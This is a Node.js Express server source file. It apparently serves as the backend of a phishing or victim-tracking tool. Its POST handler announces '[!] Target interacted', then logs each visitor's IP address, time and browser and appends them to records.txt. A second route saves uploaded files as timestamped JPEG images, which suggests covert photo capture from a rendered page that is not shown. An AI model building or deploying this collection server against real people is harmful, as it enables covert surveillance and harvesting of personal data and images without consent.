const express = require('express');
const app = express();
const cors = require('cors');
// let bodyParser = require('body-parser');
let fs = require('fs');
let dateT = require('node-datetime');


let dt = dateT.create();
// let frmt = dt.format('Y-m-d H:M:S')
let frmt = dt.format('Y-m-d ')

const port = 5000;
// app.use(bodyParser());
app.use(express.urlencoded({extended:true}));
app.use(express.json());

app.set('trust proxy', true);
app.use(cors());
app.set('view engine', 'ejs');
var multer = require('multer');


// configure multer to handle the file upload
var storage = multer.diskStorage({
    destination: function (req, file, cb) {
      cb(null, 'images/')
    },
    filename: function (req, file, cb) {
      cb(null, file.fieldname + '-' + Date.now()+".jpeg")
    }
  });
  var upload = multer({ storage: storage });

app.get('/', (req, res)=>{
    const ip = req.ip;
    res.render("index");
});

app.post('/', (req, res)=>{
    console.log()
    console.log("[!] Target interacted")
    console.log("[*] IP: " + req.body.ip);
    console.log("[*] Time: " +frmt + req.body.t);
    console.log("[*] user: " + req.body.browser);
    // fs.appendFile('records.txt', frmt+"  ->  "+req.body.ip +"\n", (err)=>{
    fs.appendFile('records.txt', "Time: " + req.body.t+"\nIP: "+req.body.ip +"\nUser: " + req.body.browser + "\n\n\n", (err)=>{
    if(err) throw err;
        console.log('[!] Data Saved successfully!');
    })
    res.status(200)
})

app.post('/img', upload.single('file'), (req, res, next)=>{

  if (!req.file) {
    res.status(400).send('No file uploaded.');
    return;
  }
//   console.log(req.file);
//   res.send('File uploaded successfully.');
});

app.listen(port, ()=>{
    console.log('server running on port: '+port);
})